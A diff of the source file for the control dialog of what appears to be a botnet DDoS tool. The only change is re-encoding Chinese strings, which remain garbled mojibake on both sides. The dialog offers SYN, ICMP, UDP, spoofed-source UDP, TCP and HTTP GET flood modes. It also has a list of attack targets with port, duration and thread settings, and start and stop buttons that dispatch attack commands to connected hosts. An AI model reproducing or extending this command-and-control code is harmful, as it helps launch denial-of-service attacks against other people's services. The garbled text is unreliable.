@@ -1,4 +1,4 @@
-ï»¿// DDOS.cpp : implementation file
+// DDOS.cpp : implementation file
 //
 
 #include "stdafx.h"
@@ -133,11 +133,11 @@ void CDDOS::OnSelchangeComboMs()
 	{
 		bao=3;
 	}
-	else if (hua=="[4]UDP ç¢ç‰‡")
+	else if (hua=="[4]UDP ËéÆ¬")
 	{
 		bao=4;
 	}
-	else if (hua=="[5]ä¼ªé€ æºUDP")
+	else if (hua=="[5]Î±ÔìÔ´UDP")
 	{
 		bao=5;
 	}
@@ -145,23 +145,23 @@ void CDDOS::OnSelchangeComboMs()
 	{
 		bao=6;
 	}
-	else if (hua=="[7]TCP å¤šè¿æ¥")
+	else if (hua=="[7]TCP ¶àÁ¬½Ó")
 	{
 		bao=7;
 	}
-	else if (hua=="[8]æ ‡å‡†CC")
+	else if (hua=="[8]±ê×¼CC")
 	{
 		bao=8;
 	}
-	else if (hua=="[9]å˜å¼‚CC")
+	else if (hua=="[9]±äÒìCC")
 	{
 		bao=9;
 	}
-	else if (hua=="[10]æ— ç¼“å†²GETæ´ªæ°´")
+	else if (hua=="[10]ÎŞ»º³åGETºéË®")
 	{
 		bao=10;
 	}
-	else if (hua=="[11]HTTPç©ºGETè¯·æ±‚")
+	else if (hua=="[11]HTTP¿ÕGETÇëÇó")
 	{
 		bao=11;
 	}
@@ -186,11 +186,11 @@ void CDDOS::OnSelchangeComboMs1()
 	{
 		bao1=3;
 	}
-	else if (hua1=="[4]UDP ç¢ç‰‡")
+	else if (hua1=="[4]UDP ËéÆ¬")
 	{
 		bao1=4;
 	}
-	else if (hua1=="[5]ä¼ªé€ æºUDP")
+	else if (hua1=="[5]Î±ÔìÔ´UDP")
 	{
 		bao1=5;
 	}
@@ -198,23 +198,23 @@ void CDDOS::OnSelchangeComboMs1()
 	{
 		bao1=6;
 	}
-	else if (hua1=="[7]TCP å¤šè¿æ¥")
+	else if (hua1=="[7]TCP ¶àÁ¬½Ó")
 	{
 		bao1=7;
 	}
-	else if (hua1=="[8]æ ‡å‡†CC")
+	else if (hua1=="[8]±ê×¼CC")
 	{
 		bao1=8;
 	}
-	else if (hua1=="[9]å˜å¼‚CC")
+	else if (hua1=="[9]±äÒìCC")
 	{
 		bao1=9;
 	}
-	else if (hua1=="[10]æ— ç¼“å†²GETæ´ªæ°´")
+	else if (hua1=="[10]ÎŞ»º³åGETºéË®")
 	{
 		bao1=10;
 	}
-	else if (hua1=="[11]HTTPç©ºGETè¯·æ±‚")
+	else if (hua1=="[11]HTTP¿ÕGETÇëÇó")
 	{
 		bao1=11;
 	}
@@ -234,7 +234,7 @@ void CDDOS::OnActivateView(BOOL bActivate, CView* pActivateView, CView* pDeactiv
 // 	m_Button1.SetIcon(IDI_Checkmark);
 // 	m_Button1.OffsetColor(CButtonST::BTNST_COLOR_BK_IN, shBtnColor);
 // //	m_Button1.SetRounded(TRUE);
-// //XPé£æ ¼ï¼Œæ˜¾ç¤ºå››å‘¨çš„è½®å»“
+// //XP·ç¸ñ£¬ÏÔÊ¾ËÄÖÜµÄÂÖÀª
 // 	m_Delete.SetIcon(IDI_Delete);
 // 	m_Add.SetIcon(IDI_Add);
 // 	m_Start.SetIcon(IDI_Start);
@@ -251,23 +251,23 @@ void CDDOS::OnActivateView(BOOL bActivate, CView* pActivateView, CView* pDeactiv
 		m_ms1.AddString("[1]SYN Flood");
 		m_ms1.AddString("[2]ICMP Flood");
 		m_ms1.AddString("[3]UDP Flood");
-		m_ms1.AddString("[4]UDP ç¢ç‰‡");
-		m_ms1.AddString("[5]ä¼ªé€ æºUDP");
+		m_ms1.AddString("[4]UDP ËéÆ¬");
+		m_ms1.AddString("[5]Î±ÔìÔ´UDP");
 		m_ms1.AddString("[6]TCP Flood");
-		m_ms1.AddString("[7]TCP å¤šè¿æ¥");
-		m_ms1.AddString("[8]æ ‡å‡†CC");
-		m_ms1.AddString("[9]å˜å¼‚CC");
-		m_ms1.AddString("[10]æ— ç¼“å†²GETæ´ªæ°´");
-		m_ms1.AddString("[11]HTTPç©ºGETè¯·æ±‚");
+		m_ms1.AddString("[7]TCP ¶àÁ¬½Ó");
+		m_ms1.AddString("[8]±ê×¼CC");
+		m_ms1.AddString("[9]±äÒìCC");
+		m_ms1.AddString("[10]ÎŞ»º³åGETºéË®");
+		m_ms1.AddString("[11]HTTP¿ÕGETÇëÇó");
 		m_ms1.SetCurSel(0);
 		
 		ListView_SetExtendedListViewStyle(m_atklist.m_hWnd,LVS_EX_GRIDLINES | LVS_EX_FULLROWSELECT);
-		m_atklist.InsertColumn(0, "æ”»å‡»ç›®æ ‡",LVCFMT_LEFT,200);
-		m_atklist.InsertColumn(1, "ç«¯å£",LVCFMT_LEFT,42);
-		m_atklist.InsertColumn(2, "æ—¶é—´",LVCFMT_LEFT,42);
-		m_atklist.InsertColumn(3, "çº¿ç¨‹",LVCFMT_LEFT,42);
-		m_atklist.InsertColumn(4, "æ¨¡å¼",LVCFMT_LEFT,42);
-		m_atklist.InsertColumn(5, "çŠ¶æ€",LVCFMT_LEFT,40);
+		m_atklist.InsertColumn(0, "¹¥»÷Ä¿±ê",LVCFMT_LEFT,200);
+		m_atklist.InsertColumn(1, "¶Ë¿Ú",LVCFMT_LEFT,42);
+		m_atklist.InsertColumn(2, "Ê±¼ä",LVCFMT_LEFT,42);
+		m_atklist.InsertColumn(3, "Ïß³Ì",LVCFMT_LEFT,42);
+		m_atklist.InsertColumn(4, "Ä£Ê½",LVCFMT_LEFT,42);
+		m_atklist.InsertColumn(5, "×´Ì¬",LVCFMT_LEFT,40);
 		isupdatedata1=false;
 	}
 
@@ -278,14 +278,14 @@ if (isupdatedata==true)
 	m_ms.AddString("[1]SYN Flood");
 	m_ms.AddString("[2]ICMP Flood");
 	m_ms.AddString("[3]UDP Flood");
-	m_ms.AddString("[4]UDP ç¢ç‰‡");
-	m_ms.AddString("[5]ä¼ªé€ æºUDP");
+	m_ms.AddString("[4]UDP ËéÆ¬");
+	m_ms.AddString("[5]Î±ÔìÔ´UDP");
 	m_ms.AddString("[6]TCP Flood");
-	m_ms.AddString("[7]TCP å¤šè¿æ¥");
-	m_ms.AddString("[8]æ ‡å‡†CC");
-	m_ms.AddString("[9]å˜å¼‚CC");
-	m_ms.AddString("[10]æ— ç¼“å†²GETæ´ªæ°´");
-	m_ms.AddString("[11]HTTPç©ºGETè¯·æ±‚");
+	m_ms.AddString("[7]TCP ¶àÁ¬½Ó");
+	m_ms.AddString("[8]±ê×¼CC");
+	m_ms.AddString("[9]±äÒìCC");
+	m_ms.AddString("[10]ÎŞ»º³åGETºéË®");
+	m_ms.AddString("[11]HTTP¿ÕGETÇëÇó");
 	m_ms.SetCurSel(0);
 
 	isupdatedata=false;
@@ -306,7 +306,7 @@ void CDDOS::OnButtonAdd()
 	m_atklist.SetItemText(n,2,m_time1);
 	m_atklist.SetItemText(n,3,m_thread1);
 	m_atklist.SetItemText(n,4,temp);
-	m_atklist.SetItemText(n,5,"å¾…å‘½");
+	m_atklist.SetItemText(n,5,"´ıÃü");
 }
 
 void CDDOS::OnButtonDel() 
@@ -317,7 +317,7 @@ void CDDOS::OnButtonDel()
 	pos = m_atklist.GetFirstSelectedItemPosition();
 	if (pos == NULL)
 	{
-		MessageBox("è¯·é€‰æ‹©ä¸€ä¸ªç›®æ ‡   ","æç¤º", MB_OK|MB_ICONWARNING);
+		MessageBox("ÇëÑ¡ÔñÒ»¸öÄ¿±ê   ","ÌáÊ¾", MB_OK|MB_ICONWARNING);
 		return;
 	}
 	int check = m_atklist.GetNextSelectedItem(pos);
@@ -357,15 +357,15 @@ void CDDOS::OnButtonBegin()
 // 		{
 // 			SOCKET SerSock = pList->GetItemData(i);
 // 			m_ddosiocp->SendMsg(SerSock,(char *)&go,sizeof(go));
-// 			pList->SetItemText(i,1,"æ´»åŠ¨");
+// 			pList->SetItemText(i,1,"»î¶¯");
 // 		}
 // 	}	
 // 	n=pMsg->GetItemCount();
 // 	CTime time=CTime::GetCurrentTime();	
-// 	CString m_strTime=time.Format("%Yå¹´%mæœˆ%dæ—¥ %H:%M:%S");
+// 	CString m_strTime=time.Format("%YÄê%mÔÂ%dÈÕ %H:%M:%S");
 // 	n=pMsg->GetItemCount();
 // 	pMsg->InsertItem(n,m_strTime);
-// 	pMsg->SetItemText(n,1,"è¢«é€‰ä¸»æœºå·²ç»è¿›å…¥æ”»å‡»çŠ¶æ€");
+// 	pMsg->SetItemText(n,1,"±»Ñ¡Ö÷»úÒÑ¾­½øÈë¹¥»÷×´Ì¬");
 }
 
 void CDDOS::OnButtonStop() 
@@ -389,23 +389,23 @@ void CDDOS::OnButtonStop()
 // 		{
 // 			SOCKET SerSock = pList->GetItemData(i);
 // 			m_ddosiocp->SendMsg(SerSock,(char *)&go,sizeof(go));
-// 			pList->SetItemText(i,1,"å¾…å‘½");
+// 			pList->SetItemText(i,1,"´ıÃü");
 // 		}
 // 	}
 // 	n=pMsg->GetItemCount();
 // 	CTime time=CTime::GetCurrentTime();	
-// 	CString m_strTime=time.Format("%Yå¹´%mæœˆ%dæ—¥ %H:%M:%S");
+// 	CString m_strTime=time.Format("%YÄê%mÔÂ%dÈÕ %H:%M:%S");
 // 	n=pMsg->GetItemCount();
 // 	pMsg->InsertItem(n,m_strTime);
-// 	pMsg->SetItemText(n,1,"è¢«é€‰ä¸»æœºå·²ç»åœæ­¢æ”»å‡»");
+// 	pMsg->SetItemText(n,1,"±»Ñ¡Ö÷»úÒÑ¾­Í£Ö¹¹¥»÷");
 }
 
 void CDDOS::OnRadio11() 
 {
 	if ( g_pConnectView == NULL ) 
 	{
-		//AfxMessageBox("å°šæœªåˆå§‹åŒ–,è¯·ç­‰å¾…ä¸»æœºä¸Šçº¿");
-		MessageBox("å°šæœªåˆå§‹åŒ–,è¯·ç­‰å¾…ä¸»æœºä¸Šçº¿","æç¤º", MB_OK|MB_ICONWARNING);
+		//AfxMessageBox("ÉĞÎ´³õÊ¼»¯,ÇëµÈ´ıÖ÷»úÉÏÏß");
+		MessageBox("ÉĞÎ´³õÊ¼»¯,ÇëµÈ´ıÖ÷»úÉÏÏß","ÌáÊ¾", MB_OK|MB_ICONWARNING);
 		return;
 	}
 	
@@ -422,8 +422,8 @@ void CDDOS::OnRadio12()
 {
 	if ( g_pConnectView == NULL ) 
 	{
-	//	AfxMessageBox("å°šæœªåˆå§‹åŒ–,è¯·ç­‰å¾…ä¸»æœºä¸Šçº¿");
-		MessageBox("å°šæœªåˆå§‹åŒ–,è¯·ç­‰å¾…ä¸»æœºä¸Šçº¿","æç¤º", MB_OK|MB_ICONWARNING);
+	//	AfxMessageBox("ÉĞÎ´³õÊ¼»¯,ÇëµÈ´ıÖ÷»úÉÏÏß");
+		MessageBox("ÉĞÎ´³õÊ¼»¯,ÇëµÈ´ıÖ÷»úÉÏÏß","ÌáÊ¾", MB_OK|MB_ICONWARNING);
 		return;
 	}
 	
@@ -438,8 +438,8 @@ void CDDOS::OnButton1()
 {
 	if ( g_pConnectView == NULL ) 
 	{
-//		AfxMessageBox("å°šæœªåˆå§‹åŒ–,è¯·ç­‰å¾…ä¸»æœºä¸Šçº¿");
-		MessageBox("å°šæœªåˆå§‹åŒ–,è¯·ç­‰å¾…ä¸»æœºä¸Šçº¿","æç¤º", MB_OK|MB_ICONWARNING);
+//		AfxMessageBox("ÉĞÎ´³õÊ¼»¯,ÇëµÈ´ıÖ÷»úÉÏÏß");
+		MessageBox("ÉĞÎ´³õÊ¼»¯,ÇëµÈ´ıÖ÷»úÉÏÏß","ÌáÊ¾", MB_OK|MB_ICONWARNING);
 		return;
 	}
 
@@ -447,7 +447,7 @@ void CDDOS::OnButton1()
 	CString Server;
 	GetDlgItem(IDC_EDIT5)->GetWindowText(Server);   //
 	if(Server<="0")
-    MessageBox("è¯·è¾“å…¥æœºå™¨æ•°","æç¤º");
+    MessageBox("ÇëÊäÈë»úÆ÷Êı","ÌáÊ¾");
 	else
 	{
 		for (int i = 0; i < g_pConnectView->m_pListCtrl->GetItemCount(); i++)   
@@ -464,8 +464,8 @@ void CDDOS::OnRadio13()
 {
 	if ( g_pConnectView == NULL ) 
 	{
-//		AfxMessageBox("å°šæœªåˆå§‹åŒ–,è¯·ç­‰å¾…ä¸»æœºä¸Šçº¿");
-		MessageBox("å°šæœªåˆå§‹åŒ–,è¯·ç­‰å¾…ä¸»æœºä¸Šçº¿","æç¤º", MB_OK|MB_ICONWARNING);
+//		AfxMessageBox("ÉĞÎ´³õÊ¼»¯,ÇëµÈ´ıÖ÷»úÉÏÏß");
+		MessageBox("ÉĞÎ´³õÊ¼»¯,ÇëµÈ´ıÖ÷»úÉÏÏß","ÌáÊ¾", MB_OK|MB_ICONWARNING);
 		return;
 	}
 	
@@ -483,8 +483,8 @@ void CDDOS::OnRadio14()
 {
 	if ( g_pConnectView == NULL ) 
 	{
-		//AfxMessageBox("å°šæœªåˆå§‹åŒ–,è¯·ç­‰å¾…ä¸»æœºä¸Šçº¿");
-		MessageBox("å°šæœªåˆå§‹åŒ–,è¯·ç­‰å¾…ä¸»æœºä¸Šçº¿","æç¤º", MB_OK|MB_ICONWARNING);
+		//AfxMessageBox("ÉĞÎ´³õÊ¼»¯,ÇëµÈ´ıÖ÷»úÉÏÏß");
+		MessageBox("ÉĞÎ´³õÊ¼»¯,ÇëµÈ´ıÖ÷»úÉÏÏß","ÌáÊ¾", MB_OK|MB_ICONWARNING);
 		return;
 	}
 	
@@ -502,8 +502,8 @@ void CDDOS::OnRadio15()
 {
 	if ( g_pConnectView == NULL ) 
 	{
-		//AfxMessageBox("å°šæœªåˆå§‹åŒ–,è¯·ç­‰å¾…ä¸»æœºä¸Šçº¿");
-		MessageBox("å°šæœªåˆå§‹åŒ–,è¯·ç­‰å¾…ä¸»æœºä¸Šçº¿","æç¤º", MB_OK|MB_ICONWARNING);
+		//AfxMessageBox("ÉĞÎ´³õÊ¼»¯,ÇëµÈ´ıÖ÷»úÉÏÏß");
+		MessageBox("ÉĞÎ´³õÊ¼»¯,ÇëµÈ´ıÖ÷»úÉÏÏß","ÌáÊ¾", MB_OK|MB_ICONWARNING);
 		return;
 	}
 	
@@ -527,7 +527,7 @@ void CDDOS::OnButtonBegin1()
 	pos = m_atklist.GetFirstSelectedItemPosition();
 	if (pos == NULL)
 	{
-		MessageBox("è¯·é€‰æ‹©ä¸€ä¸ªç›®æ ‡   ","é”™è¯¯", MB_OK|MB_ICONWARNING);
+		MessageBox("ÇëÑ¡ÔñÒ»¸öÄ¿±ê   ","´íÎó", MB_OK|MB_ICONWARNING);
 		return;
 	}
 	int check = m_atklist.GetNextSelectedItem(pos);
@@ -548,7 +548,7 @@ void CDDOS::OnButtonBegin1()
 	go->pt=atoi(m_atklist.GetItemText(check,4));
 	
 
-	m_atklist.SetItemText(check,5,"æ”»å‡»");
+	m_atklist.SetItemText(check,5,"¹¥»÷");
 
 	g_pConnectView->Attack( (BYTE*)go, sizeof(IMESSAGE));
 }
@@ -563,14 +563,14 @@ void CDDOS::OnButtonStop1()
 	pos = m_atklist.GetFirstSelectedItemPosition();
 	if (pos == NULL)
 	{
-		MessageBox("è¯·é€‰æ‹©ä¸€ä¸ªç›®æ ‡   ","é”™è¯¯", MB_OK|MB_ICONWARNING);
+		MessageBox("ÇëÑ¡ÔñÒ»¸öÄ¿±ê   ","´íÎó", MB_OK|MB_ICONWARNING);
 		return;
 	}
 	int check = m_atklist.GetNextSelectedItem(pos);
 	
 	go->thread=atoi(m_atklist.GetItemText(check,3));
 	
-	m_atklist.SetItemText(check,5,"å¾…å‘½");
+	m_atklist.SetItemText(check,5,"´ıÃü");
 
 	g_pConnectView->StopAttack( (BYTE*)go, sizeof(IMESSAGE));
 }
@@ -581,8 +581,8 @@ void CDDOS::OnRadio16()
 	// TODO: Add your control notification handler code here
 	if ( g_pConnectView == NULL ) 
 	{
-		//AfxMessageBox("å°šæœªåˆå§‹åŒ–,è¯·ç­‰å¾…ä¸»æœºä¸Šçº¿");
-		MessageBox("å°šæœªåˆå§‹åŒ–,è¯·ç­‰å¾…ä¸»æœºä¸Šçº¿","æç¤º", MB_OK|MB_ICONWARNING);
+		//AfxMessageBox("ÉĞÎ´³õÊ¼»¯,ÇëµÈ´ıÖ÷»úÉÏÏß");
+		MessageBox("ÉĞÎ´³õÊ¼»¯,ÇëµÈ´ıÖ÷»úÉÏÏß","ÌáÊ¾", MB_OK|MB_ICONWARNING);
 		return;
 	}
 	for (int i = 0; i < g_pConnectView->m_pListCtrl->GetItemCount(); i++)   
@@ -604,8 +604,8 @@ void CDDOS::OnRadio17()
 	// TODO: Add your control notification handler code here
 	if ( g_pConnectView == NULL ) 
 	{
-	//	AfxMessageBox("å°šæœªåˆå§‹åŒ–,è¯·ç­‰å¾…ä¸»æœºä¸Šçº¿");
-		MessageBox("å°šæœªåˆå§‹åŒ–,è¯·ç­‰å¾…ä¸»æœºä¸Šçº¿","æç¤º", MB_OK|MB_ICONWARNING);
+	//	AfxMessageBox("ÉĞÎ´³õÊ¼»¯,ÇëµÈ´ıÖ÷»úÉÏÏß");
+		MessageBox("ÉĞÎ´³õÊ¼»¯,ÇëµÈ´ıÖ÷»úÉÏÏß","ÌáÊ¾", MB_OK|MB_ICONWARNING);
 		return;
 	}
 	
@@ -623,8 +623,8 @@ void CDDOS::OnRadio18()
 	// TODO: Add your control notification handler code here
 	if ( g_pConnectView == NULL ) 
 	{
-		//AfxMessageBox("å°šæœªåˆå§‹åŒ–,è¯·ç­‰å¾…ä¸»æœºä¸Šçº¿");
-		MessageBox("å°šæœªåˆå§‹åŒ–,è¯·ç­‰å¾…ä¸»æœºä¸Šçº¿","æç¤º", MB_OK|MB_ICONWARNING);
+		//AfxMessageBox("ÉĞÎ´³õÊ¼»¯,ÇëµÈ´ıÖ÷»úÉÏÏß");
+		MessageBox("ÉĞÎ´³õÊ¼»¯,ÇëµÈ´ıÖ÷»úÉÏÏß","ÌáÊ¾", MB_OK|MB_ICONWARNING);
 		return;
 	}
 	
